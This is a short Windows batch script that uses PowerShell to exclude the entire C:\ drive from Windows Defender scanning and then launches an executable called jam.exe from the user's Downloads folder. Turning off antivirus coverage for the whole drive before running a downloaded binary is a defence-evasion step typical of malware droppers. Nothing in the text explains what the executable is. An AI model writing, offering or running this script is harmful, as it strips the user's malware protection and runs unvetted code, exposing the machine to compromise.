@echo off
setlocal

:: Exclude C:\ drive from Windows Defender
echo Excluding C:\ drive from Windows Defender...
powershell -Command "Add-MpPreference -ExclusionPath 'C:\'"

echo C:\ drive has been excluded from Windows Defender.

:: Run jam.exe from Downloads folder
echo Running jam.exe from Downloads folder...
cd %USERPROFILE%\Downloads
start jam.exe

pause